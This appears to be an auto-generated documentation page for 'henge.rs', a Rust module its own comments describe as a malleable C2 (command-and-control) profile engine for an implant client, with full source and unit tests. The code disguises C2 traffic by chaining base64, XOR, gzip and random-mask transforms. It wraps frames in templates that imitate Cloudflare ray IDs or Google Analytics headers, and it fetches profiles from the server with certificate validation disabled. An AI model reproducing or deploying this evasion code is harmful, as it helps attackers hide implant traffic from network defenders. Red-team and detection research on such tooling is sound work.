# henge

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/henge.rs` |
| **Lines** | 705 |
| **Cards** | T019-networking |
| **Role** | Malleable C2 profile engine |

## Types

### struct `HengeProfile` (line 21)

## Public API

### `raw` (line 42)
```rust
pub fn raw() -> Self
```
Pass-through profile — no transformation.

### `from_client_config` (line 52)
```rust
pub fn from_client_config(cfg: &Value) -> Self
```
Build from the `client_config` object returned by `/api/henge/active`.

### `is_raw` (line 117)
```rust
pub fn is_raw(&self) -> bool
```

### `encode_data` (line 232)
```rust
pub fn encode_data(data: &[u8], transforms: &[String]) -> anyhow::Result<Vec<u8>>
```

### `decode_data` (line 241)
```rust
pub fn decode_data(data: &[u8], transforms: &[String]) -> anyhow::Result<Vec<u8>>
```

### `wrap_ws` (line 290)
```rust
pub fn wrap_ws(&self, encoded: &[u8]) -> Vec<u8>
```
Wrap encoded bytes in the WebSocket JSON envelope.

### `unwrap_ws` (line 300)
```rust
pub fn unwrap_ws(&self, data: &[u8]) -> Vec<u8>
```
Extract the encoded payload from a WebSocket JSON envelope.

### `encode` (line 322)
```rust
pub fn encode(&self, data: &[u8]) -> anyhow::Result<Vec<u8>>
```
Encode raw binary frame through the transform pipeline.

### `decode` (line 327)
```rust
pub fn decode(&self, data: &[u8]) -> anyhow::Result<Vec<u8>>
```
Decode transformed data back to raw binary.

### `wrap_http_request` (line 335)
```rust
pub fn wrap_http_request(&self, encoded: &[u8]) -> (Vec<u8>, String)
```
Wrap encoded bytes as an HTTP POST body (client → server).
Returns (body_bytes, content_type).

### `unwrap_http_response` (line 346)
```rust
pub fn unwrap_http_response(&self, body: &[u8], headers: &[(String, String)]) -> Vec<u8>
```
Extract encoded payload from an HTTP GET response body (server → client).
Checks the wrapper first, then falls back to data_header, then raw.

## Internal Functions

- `parse_transform` (line 124)
- `apply_encode` (line 132)
- `apply_decode` (line 175)
- `random_hex` (line 252)
- `fill_template` (line 258)
- `extract_from_template` — Extract the `{DATA}` value from a filled template using the original (line 269)
- `find_data_field` (line 374)
- `raw_profile_is_identified_as_raw` (line 408)
- `raw_profile_has_empty_transforms` (line 415)
- `from_client_config_parses_transforms` (line 424)
- `from_client_config_defaults_to_raw_on_empty` (line 440)
- `from_client_config_parses_ws_wrapper` (line 448)
- `parse_transform_splits_on_colon` (line 461)
- `parse_transform_no_colon_gives_empty_param` (line 468)
- `base64_encode_decode_roundtrip` (line 477)
- `base64url_encode_decode_roundtrip` (line 485)
- `hex_encode_decode_roundtrip` (line 495)
- `xor_encode_decode_roundtrip_hex_key` (line 507)
- `xor_encode_decode_roundtrip_decimal_key` (line 515)
- `xor_without_key_returns_error` (line 523)
- `gzip_encode_decode_roundtrip` (line 531)
- `prepend_encode_decode_roundtrip` (line 543)
- `append_encode_decode_roundtrip` (line 552)
- `mask_encode_prepends_random_bytes` (line 563)
- `mask_decode_recovers_original` (line 571)
- `mask_decode_recovers_with_default_size` (line 579)
- `multi_transform_pipeline_roundtrip` (line 591)
- `decode_reverses_transform_order` (line 604)
- `empty_transform_list_is_identity` (line 614)
- `profile_encode_decode_via_raw_is_identity` (line 625)
- `profile_with_base64_transform_roundtrips` (line 634)
- `wrap_ws_without_wrapper_is_identity` (line 651)
- `unwrap_ws_without_wrapper_is_identity` (line 659)

## Key Dependencies

- `use base64::{engine::general_purpose, Engine as _};`
- `use flate2::{write::GzEncoder, read::GzDecoder, Compression};`
- `use rand::RngCore;`
- `use regex::Regex;`
- `use serde_json::Value;`
- `use tracing::{debug, warn};`
- `use super::*;`

## Full Source

```rust
// Henge (変化) — Malleable C2 profile engine for the Rust client.
//
// Mirrors server/henge_engine.py transforms on the client side.
// The client fetches the active profile from /api/henge/active at startup
// and applies the same encode/decode pipeline on every outbound/inbound frame.
//
// Profile updates are received via the HENGE_PROFILE_UPDATE command and
// applied atomically without dropping the WS connection.

use base64::{engine::general_purpose, Engine as _};
use flate2::{write::GzEncoder, read::GzDecoder, Compression};
use rand::RngCore;
use regex::Regex;
use serde_json::Value;
use std::io::{Read, Write};
use tracing::{debug, warn};

// ── Profile ─────────────────────────────────────────────────────────

#[derive(Clone, Debug, Default)]
pub struct HengeProfile {
    pub name: String,

    // Transform pipeline (ordered)
    pub transforms: Vec<String>,

    // WebSocket envelope
    pub ws_wrapper: Option<String>,

    // HTTP POST body (client → server)
    pub post_body_wrapper: Option<String>,
    pub post_content_type: String,

    // HTTP GET response (server → client)
    pub get_response_wrapper: Option<String>,
    pub get_response_data_header: Option<String>,
    pub get_content_type: String,
}

impl HengeProfile {
    /// Pass-through profile — no transformation.
    pub fn raw() -> Self {
        HengeProfile {
            name: "raw".to_string(),
            post_content_type: "application/octet-stream".to_string(),
            get_content_type: "application/octet-stream".to_string(),
            ..Default::default()
        }
    }

    /// Build from the `client_config` object returned by `/api/henge/active`.
    pub fn from_client_config(cfg: &Value) -> Self {
        let transforms = cfg["transforms"]
            .as_array()
            .map(|arr| {
                arr.iter()
                    .filter_map(|v| v.as_str().map(str::to_owned))
                    .collect()
            })
            .unwrap_or_default();

        let ws = cfg["websocket"].as_object();
        let ws_wrapper = ws
            .and_then(|w| w.get("wrapper"))
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(str::to_owned);

        let http = cfg["http"].as_object();

        let post_body = http.and_then(|h| h.get("post_body")).and_then(|v| v.as_object());
        let post_body_wrapper = post_body
            .and_then(|p| p.get("wrapper"))
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(str::to_owned);
        let post_content_type = post_body
            .and_then(|p| p.get("content_type"))
            .and_then(|v| v.as_str())
            .unwrap_or("application/octet-stream")
            .to_owned();

        let get_resp = http.and_then(|h| h.get("get_response")).and_then(|v| v.as_object());
        let get_response_wrapper = get_resp
            .and_then(|r| r.get("wrapper"))
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(str::to_owned);
        let get_response_data_header = get_resp
            .and_then(|r| r.get("data_header"))
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(str::to_owned);
        let get_content_type = get_resp
            .and_then(|r| r.get("content_type"))
            .and_then(|v| v.as_str())
            .unwrap_or("application/octet-stream")
            .to_owned();

        let name = cfg["profile_name"]
            .as_str()
            .unwrap_or("raw")
            .to_owned();

        HengeProfile {
            name,
            transforms,
            ws_wrapper,
            post_body_wrapper,
            post_content_type,
            get_response_wrapper,
            get_response_data_header,
            get_content_type,
        }
    }

    pub fn is_raw(&self) -> bool {
        self.name == "raw" || (self.transforms.is_empty() && self.ws_wrapper.is_none())
    }
}

// ── Transform pipeline ───────────────────────────────────────────────

fn parse_transform(spec: &str) -> (&str, &str) {
    if let Some(colon) = spec.find(':') {
        (&spec[..colon], &spec[colon + 1..])
    } else {
        (spec, "")
    }
}

fn apply_encode(data: &[u8], name: &str, param: &str) -> anyhow::Result<Vec<u8>> {
    match name {
        "base64" => Ok(general_purpose::STANDARD.encode(data).into_bytes()),
        "base64url" => Ok(general_purpose::URL_SAFE_NO_PAD.encode(data).into_bytes()),
        "hex" => Ok(data.iter().map(|b| format!("{:02x}", b)).collect::<String>().into_bytes()),
        "xor" => {
            if param.is_empty() {
                anyhow::bail!("xor requires a key parameter");
            }
            let key = u8::from_str_radix(param.trim_start_matches("0x"), 16)
                .or_else(|_| param.parse::<u8>())
                .map_err(|e| anyhow::anyhow!("xor key parse error: {}", e))?;
            Ok(data.iter().map(|b| b ^ key).collect())
        }
        "gzip" => {
            let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
            encoder.write_all(data)?;
            Ok(encoder.finish()?)
        }
        "prepend" => {
            let mut out = param.as_bytes().to_vec();
            out.extend_from_slice(data);
            Ok(out)
        }
        "append" => {
            let mut out = data.to_vec();
            out.extend_from_slice(param.as_bytes());
            Ok(out)
        }
        "mask" => {
            let n: usize = if param.is_empty() { 16 } else { param.parse().unwrap_or(16) };
            let mut mask = vec![0u8; n];
            rand::thread_rng().fill_bytes(&mut mask);
            mask.extend_from_slice(data);
            Ok(mask)
        }
        other => {
            warn!("[henge] Unknown encode transform: {}", other);
            Ok(data.to_vec())
        }
    }
}

fn apply_decode(data: &[u8], name: &str, param: &str) -> anyhow::Result<Vec<u8>> {
    match name {
        "base64" => Ok(general_purpose::STANDARD.decode(data)?),
        "base64url" => Ok(general_purpose::URL_SAFE_NO_PAD.decode(data)?),
        "hex" => {
            let s = std::str::from_utf8(data)?;
            Ok((0..s.len())
                .step_by(2)
                .map(|i| u8::from_str_radix(&s[i..i + 2], 16))
                .collect::<Result<Vec<u8>, _>>()?)
        }
        "xor" => {
            if param.is_empty() {
                anyhow::bail!("xor requires a key parameter");
            }
            let key = u8::from_str_radix(param.trim_start_matches("0x"), 16)
                .or_else(|_| param.parse::<u8>())
                .map_err(|e| anyhow::anyhow!("xor key parse error: {}", e))?;
            Ok(data.iter().map(|b| b ^ key).collect())
        }
        "gzip" => {
            let mut decoder = GzDecoder::new(data);
            let mut out = Vec::new();
            decoder.read_to_end(&mut out)?;
            Ok(out)
        }
        "prepend" => {
            let prefix = param.as_bytes();
            if data.starts_with(prefix) {
                Ok(data[prefix.len()..].to_vec())
            } else {
                Ok(data.to_vec())
            }
        }
        "append" => {
            let suffix = param.as_bytes();
            if data.ends_with(suffix) {
                Ok(data[..data.len() - suffix.len()].to_vec())
            } else {
                Ok(data.to_vec())
            }
        }
        "mask" => {
            let n: usize = if param.is_empty() { 16 } else { param.parse().unwrap_or(16) };
            if data.len() >= n {
                Ok(data[n..].to_vec())
            } else {
                Ok(data.to_vec())
            }
        }
        other => {
            warn!("[henge] Unknown decode transform: {}", other);
            Ok(data.to_vec())
        }
    }
}

pub fn encode_data(data: &[u8], transforms: &[String]) -> anyhow::Result<Vec<u8>> {
    let mut result = data.to_vec();
    for spec in transforms {
        let (name, param) = parse_transform(spec);
        result = apply_encode(&result, name, param)?;
    }
    Ok(result)
}

pub fn decode_data(data: &[u8], transforms: &[String]) -> anyhow::Result<Vec<u8>> {
    let mut result = data.to_vec();
    for spec in transforms.iter().rev() {
        let (name, param) = parse_transform(spec);
        result = apply_decode(&result, name, param)?;
    }
    Ok(result)
}

// ── Template helpers ─────────────────────────────────────────────────

fn random_hex(n: usize) -> String {
    let mut buf = vec![0u8; n];
    rand::thread_rng().fill_bytes(&mut buf);
    buf.iter().map(|b| format!("{:02x}", b)).collect()
}

fn fill_template(template: &str, data_str: &str) -> String {
    template
        .replace("{DATA}", data_str)
        .replace("{nonce}", &random_hex(16))
        .replace("{token}", &random_hex(32))
        .replace("{zone}", &random_hex(16))
        .replace("{ray_id}", &format!("{}-IAD", random_hex(8)))
}

/// Extract the `{DATA}` value from a filled template using the original
/// template as a pattern.  Falls back to the raw input on parse failure.
fn extract_from_template(filled: &str, template: &str) -> Option<String> {
    // Escape regex metacharacters in the template, then restore {DATA}
    // as a capture group.
    let escaped = regex::escape(template);
    // Replace dynamic placeholders with .*? (they may have been filled)
    let mut pattern = escaped
        .replace(&regex::escape("{nonce}"), "[0-9a-f]*")
        .replace(&regex::escape("{token}"), "[A-Za-z0-9_-]*")
        .replace(&regex::escape("{zone}"), "[0-9a-f]*")
        .replace(&regex::escape("{ray_id}"), "[0-9a-f]*-[A-Z]+");
    // Replace escaped {DATA} with capture group
    pattern = pattern.replace(&regex::escape("{DATA}"), "(.+?)");

    let re = Regex::new(&pattern).ok()?;
    re.captures(filled)?.get(1).map(|m| m.as_str().to_owned())
}

// ── WS envelope ─────────────────────────────────────────────────────

impl HengeProfile {
    /// Wrap encoded bytes in the WebSocket JSON envelope.
    pub fn wrap_ws(&self, encoded: &[u8]) -> Vec<u8> {
        if let Some(ref wrapper) = self.ws_wrapper {
            let data_str = String::from_utf8_lossy(encoded);
            fill_template(wrapper, &data_str).into_bytes()
        } else {
            encoded.to_vec()
        }
    }

    /// Extract the encoded payload from a WebSocket JSON envelope.
    pub fn unwrap_ws(&self, data: &[u8]) -> Vec<u8> {
        let Some(ref wrapper) = self.ws_wrapper else {
            return data.to_vec();
        };
        let text = String::from_utf8_lossy(data);

        // Try template extraction first
        if let Some(extracted) = extract_from_template(&text, wrapper) {
            return extracted.into_bytes();
        }

        // Fallback: look for "data" key in JSON
        if let Ok(val) = serde_json::from_str::<Value>(&text) {
            if let Some(s) = find_data_field(&val) {
                return s.into_bytes();
            }
        }

        data.to_vec()
    }

    /// Encode raw binary frame through the transform pipeline.
    pub fn encode(&self, data: &[u8]) -> anyhow::Result<Vec<u8>> {
        encode_data(data, &self.transforms)
    }

    /// Decode transformed data back to raw binary.
    pub fn decode(&self, data: &[u8]) -> anyhow::Result<Vec<u8>> {
        decode_data(data, &self.transforms)
    }

    // ── HTTP poll helpers ────────────────────────────────────────────

    /// Wrap encoded bytes as an HTTP POST body (client → server).
    /// Returns (body_bytes, content_type).
    pub fn wrap_http_request(&self, encoded: &[u8]) -> (Vec<u8>, String) {
        if let Some(ref wrapper) = self.post_body_wrapper {
            let data_str = String::from_utf8_lossy(encoded);
            (fill_template(wrapper, &data_str).into_bytes(), self.post_content_type.clone())
        } else {
            (encoded.to_vec(), self.post_content_type.clone())
        }
    }

    /// Extract encoded payload from an HTTP GET response body (server → client).
    /// Checks the wrapper first, then falls back to data_header, then raw.
    pub fn unwrap_http_response(&self, body: &[u8], headers: &[(String, String)]) -> Vec<u8> {
        // Check data_header (e.g. Google Analytics puts data in X-GA-Debug)
        if let Some(ref hdr_name) = self.get_response_data_header {
            let hdr_lower = hdr_name.to_lowercase();
            for (k, v) in headers {
                if k.to_lowercase() == hdr_lower {
                    return v.as_bytes().to_vec();
                }
            }
        }

        if let Some(ref wrapper) = self.get_response_wrapper {
            let text = String::from_utf8_lossy(body);
            if let Some(extracted) = extract_from_template(&text, wrapper) {
                return extracted.into_bytes();
            }
            // JSON fallback
            if let Ok(val) = serde_json::from_str::<Value>(&text) {
                if let Some(s) = find_data_field(&val) {
                    return s.into_bytes();
                }
            }
        }

        body.to_vec()
    }
}

fn find_data_field(val: &Value) -> Option<String> {
    match val {
        Value::Object(map) => {
            if let Some(Value::String(s)) = map.get("data") {
                return Some(s.clone());
            }
            for v in map.values() {
                if let Some(s) = find_data_field(v) {
                    return Some(s);
                }
            }
            None
        }
        Value::Array(arr) => {
            for v in arr {
                if let Some(s) = find_data_field(v) {
                    return Some(s);
                }
            }
            None
        }
        _ => None,
    }
}

// ── Tests ────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── HengeProfile::raw identity ───────────────────────────────────

    #[test]
    fn raw_profile_is_identified_as_raw() {
        let p = HengeProfile::raw();
        assert!(p.is_raw());
        assert_eq!(p.name, "raw");
    }

    #[test]
    fn raw_profile_has_empty_transforms() {
        let p = HengeProfile::raw();
        assert!(p.transforms.is_empty());
        assert!(p.ws_wrapper.is_none());
    }

    // ── HengeProfile::from_client_config ────────────────────────────

    #[test]
    fn from_client_config_parses_transforms() {
        let cfg = serde_json::json!({
            "profile_name": "test",
            "transforms": ["base64", "xor:0x42"],
            "http": {
                "post_body": { "content_type": "text/plain" },
                "get_response": {}
            }
        });
        let p = HengeProfile::from_client_config(&cfg);
        assert_eq!(p.name, "test");
        assert_eq!(p.transforms, vec!["base64", "xor:0x42"]);
        assert!(!p.is_raw());
    }

    #[test]
    fn from_client_config_defaults_to_raw_on_empty() {
        let cfg = serde_json::json!({});
        let p = HengeProfile::from_client_config(&cfg);
        assert_eq!(p.name, "raw");
        assert!(p.transforms.is_empty());
    }

    #[test]
    fn from_client_config_parses_ws_wrapper() {
        let cfg = serde_json::json!({
            "profile_name": "ws_test",
            "websocket": { "wrapper": "{\"type\":\"data\",\"payload\":\"{DATA}\"}" },
            "transforms": []
        });
        let p = HengeProfile::from_client_config(&cfg);
        assert!(p.ws_wrapper.is_some());
    }

    // ── parse_transform ──────────────────────────────────────────────

    #[test]
    fn parse_transform_splits_on_colon() {
        let (name, param) = parse_transform("xor:0x42");
        assert_eq!(name, "xor");
        assert_eq!(param, "0x42");
    }

    #[test]
    fn parse_transform_no_colon_gives_empty_param() {
        let (name, param) = parse_transform("base64");
        assert_eq!(name, "base64");
        assert_eq!(param, "");
    }

    // ── base64 roundtrip ─────────────────────────────────────────────

    #[test]
    fn base64_encode_decode_roundtrip() {
        let data = b"hello raven";
        let encoded = apply_encode(data, "base64", "").unwrap();
        let decoded = apply_decode(&encoded, "base64", "").unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn base64url_encode_decode_roundtrip() {
        let data: Vec<u8> = (0u8..=255).collect();
        let encoded = apply_encode(&data, "base64url", "").unwrap();
        let decoded = apply_decode(&encoded, "base64url", "").unwrap();
        assert_eq!(decoded, data);
    }

    // ── hex roundtrip ─────────────────────────────────────────────────

    #[test]
    fn hex_encode_decode_roundtrip() {
        let data = b"deadbeef\x00\xff";
        let encoded = apply_encode(data, "hex", "").unwrap();
        // Encoded must be ASCII hex
        assert!(encoded.iter().all(|b| b.is_ascii_hexdigit()));
        let decoded = apply_decode(&encoded, "hex", "").unwrap();
        assert_eq!(decoded, data);
    }

    // ── xor roundtrip ─────────────────────────────────────────────────

    #[test]
    fn xor_encode_decode_roundtrip_hex_key() {
        let data = b"secret payload";
        let encoded = apply_encode(data, "xor", "0x5a").unwrap();
        let decoded = apply_decode(&encoded, "xor", "0x5a").unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn xor_encode_decode_roundtrip_decimal_key() {
        let data = b"another secret";
        let encoded = apply_encode(data, "xor", "255").unwrap();
        let decoded = apply_decode(&encoded, "xor", "255").unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn xor_without_key_returns_error() {
        let result = apply_encode(b"data", "xor", "");
        assert!(result.is_err());
    }

    // ── gzip roundtrip ────────────────────────────────────────────────

    #[test]
    fn gzip_encode_decode_roundtrip() {
        let data = b"compress me please, compress me please, compress me please";
        let compressed = apply_encode(data, "gzip", "").unwrap();
        // Compressed output must be non-empty and differ from input for repetitive data
        assert!(!compressed.is_empty());
        let decompressed = apply_decode(&compressed, "gzip", "").unwrap();
        assert_eq!(decompressed, data);
    }

    // ── prepend / append ──────────────────────────────────────────────

    #[test]
    fn prepend_encode_decode_roundtrip() {
        let data = b"payload";
        let encoded = apply_encode(data, "prepend", "PREFIX_").unwrap();
        assert!(encoded.starts_with(b"PREFIX_"));
        let decoded = apply_decode(&encoded, "prepend", "PREFIX_").unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn append_encode_decode_roundtrip() {
        let data = b"payload";
        let encoded = apply_encode(data, "append", "_SUFFIX").unwrap();
        assert!(encoded.ends_with(b"_SUFFIX"));
        let decoded = apply_decode(&encoded, "append", "_SUFFIX").unwrap();
        assert_eq!(decoded, data);
    }

    // ── mask transform ────────────────────────────────────────────────

    #[test]
    fn mask_encode_prepends_random_bytes() {
        let data = b"hello";
        let masked = apply_encode(data, "mask", "8").unwrap();
        // Masked output is 8 + 5 = 13 bytes
        assert_eq!(masked.len(), 13);
    }

    #[test]
    fn mask_decode_recovers_original() {
        let data = b"hello world";
        let encoded = apply_encode(data, "mask", "16").unwrap();
        let decoded = apply_decode(&encoded, "mask", "16").unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn mask_decode_recovers_with_default_size() {
        let data = b"test data";
        // Default mask size is 16
        let encoded = apply_encode(data, "mask", "").unwrap();
        assert_eq!(encoded.len(), data.len() + 16);
        let decoded = apply_decode(&encoded, "mask", "").unwrap();
        assert_eq!(decoded, data);
    }

    // ── Multi-transform pipeline ──────────────────────────────────────

    #[test]
    fn multi_transform_pipeline_roundtrip() {
        let transforms = vec![
            "base64".to_string(),
            "prepend:START_".to_string(),
            "append:_END".to_string(),
        ];
        let data = b"multi step payload";
        let encoded = encode_data(data, &transforms).unwrap();
        let decoded = decode_data(&encoded, &transforms).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn decode_reverses_transform_order() {
        // Encode with xor then base64.  Decode must apply base64 decode first, then xor.
        let transforms = vec!["xor:0x5a".to_string(), "base64".to_string()];
        let data = b"order matters";
        let encoded = encode_data(data, &transforms).unwrap();
        let decoded = decode_data(&encoded, &transforms).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn empty_transform_list_is_identity() {
        let data = b"no transform";
        let encoded = encode_data(data, &[]).unwrap();
        assert_eq!(encoded, data);
        let decoded = decode_data(data, &[]).unwrap();
        assert_eq!(decoded, data);
    }

    // ── HengeProfile encode/decode wrappers ──────────────────────────

    #[test]
    fn profile_encode_decode_via_raw_is_identity() {
        let p = HengeProfile::raw();
        let data = b"raw identity check";
        let encoded = p.encode(data).unwrap();
        let decoded = p.decode(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn profile_with_base64_transform_roundtrips() {
        let p = HengeProfile {
            name: "b64".to_string(),
            transforms: vec!["base64".to_string()],
            post_content_type: "application/octet-stream".to_string(),
            get_content_type: "application/octet-stream".to_string(),
            ..Default::default()
        };
        let data = b"profile encode decode";
        let encoded = p.encode(data).unwrap();
        let decoded = p.decode(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    // ── WS wrap/unwrap (no wrapper → passthrough) ─────────────────────

    #[test]
    fn wrap_ws_without_wrapper_is_identity() {
        let p = HengeProfile::raw();
        let data = b"binary frame";
        let wrapped = p.wrap_ws(data);
        assert_eq!(wrapped, data);
    }

    #[test]
    fn unwrap_ws_without_wrapper_is_identity() {
        let p = HengeProfile::raw();
        let data = b"binary frame";
        let unwrapped = p.unwrap_ws(data);
        assert_eq!(unwrapped, data);
    }
}

// ── Startup fetch ────────────────────────────────────────────────────

/// Fetch the active Henge profile from the server.
/// Returns `HengeProfile::raw()` on any error (safe fallback).
pub async fn fetch_active_profile(base_url: &str) -> HengeProfile {
    let url = format!("{}/api/henge/active", base_url);
    let client = match reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .danger_accept_invalid_certs(true)
        .build()
    {
        Ok(c) => c,
        Err(_) => return HengeProfile::raw(),
    };

    match client.get(&url).send().await {
        Ok(resp) if resp.status().is_success() => {
            match resp.json::<Value>().await {
                Ok(body) => {
                    let profile = HengeProfile::from_client_config(&body["client_config"]);
                    debug!("[henge] Active profile fetched: {}", profile.name);
                    profile
                }
                Err(e) => {
                    warn!("[henge] Failed to parse /api/henge/active response: {}", e);
                    HengeProfile::raw()
                }
            }
        }
        Ok(resp) => {
            debug!("[henge] /api/henge/active returned HTTP {}", resp.status());
            HengeProfile::raw()
        }
        Err(e) => {
            debug!("[henge] /api/henge/active unreachable: {}", e);
            HengeProfile::raw()
        }
    }
}

```